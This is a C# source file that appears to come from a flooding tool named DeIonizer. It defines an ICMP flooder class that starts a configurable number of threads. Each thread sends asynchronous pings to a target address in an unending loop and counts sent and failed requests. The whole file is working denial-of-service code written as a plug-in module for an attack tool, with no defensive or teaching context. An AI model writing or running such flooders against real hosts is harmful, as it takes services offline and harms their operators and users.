using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

namespace DeIonizer.Core.Flooders
{
    public class IcmpFlooder : BaseFlooder
    {
        public override string DisplayName => "ICMP";

        private List<Thread> WorkerThreads { get; } = new List<Thread>();

        public override event EventHandler FloodError;

        private void Initialize()
        {
            //Reset
            WorkerThreads.ForEach(t => t.Abort());
            WorkerThreads.Clear();
        }

        private void SpamLoop()
        {
            //Infinitely spam
            try
            {
                var remoteHost = new IPEndPoint(Target, Port);
                while (IsFlooding)
                {
                    using (var pinger = new Ping())
                    {
                        try
                        {
                            while (IsFlooding)
                            {
                                pinger.SendPingAsync(remoteHost.Address);
                                Requested++;
                            }
                        }
                        catch { Failed++; }
                    }
                }
            }
            catch
            {
                //Oh no, a thread died
                IsFlooding = false;
                FloodError?.Invoke(this, EventArgs.Empty);
            }
        }

        public override void Start()
        {
            base.Start();
            for (int i = 0; i < Threads; i++)
            {
                WorkerThreads.Add(new Thread(SpamLoop));
            }
            foreach (var worker in WorkerThreads)
            {
                worker.Start();
            }
        }

        public override void Stop()
        {
            base.Stop();
            Initialize(); //Nuke everything
        }

        public override void Reset()
        {
            Initialize();
            base.Reset();
        }
    }
}